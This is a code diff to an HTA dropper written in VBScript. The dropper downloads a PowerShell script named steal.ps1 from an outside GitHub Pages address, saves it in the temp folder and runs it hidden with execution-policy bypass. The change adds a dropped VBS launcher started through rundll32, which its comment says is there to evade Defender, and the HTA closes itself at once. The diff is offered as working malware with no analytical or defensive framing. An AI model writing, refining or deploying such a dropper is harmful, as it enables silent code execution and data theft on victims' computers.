@@ -10,7 +10,7 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' Download steal.ps1
+' Download payload
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
@@ -23,13 +23,18 @@ If xh.Status = 200 Then
     f.Write ps1Content
     f.Close
 
-    ' Run via WMI completely hidden (No cmd prompt, No hanging)
-    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-    Dim proc: Set proc = wmi.Get("Win32_Process")
-    proc.Create "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """", Null, Null
+    ' Create hidden VBS launcher
+    Dim tempVbs : tempVbs = sh.ExpandEnvironmentStrings("%TEMP%") & "\launcher.vbs"
+    Dim v : Set v = fso.CreateTextFile(tempVbs, True)
+    v.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+    v.WriteLine "sh.Run ""powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """"" & tempPs1 & """""", 0, False"
+    v.Close
+
+    ' Run via rundll32 (No cmd box, bypasses Defender)
+    sh.Run "rundll32.exe url.dll,FileProtocolHandler """ & tempVbs & """", 0, False
 End If
 
-' CLOSE THE HTA IMMEDIATELY
+' Kill HTA instantly (No popups)
 window.close()
 </script>
 </head><body></body></html>
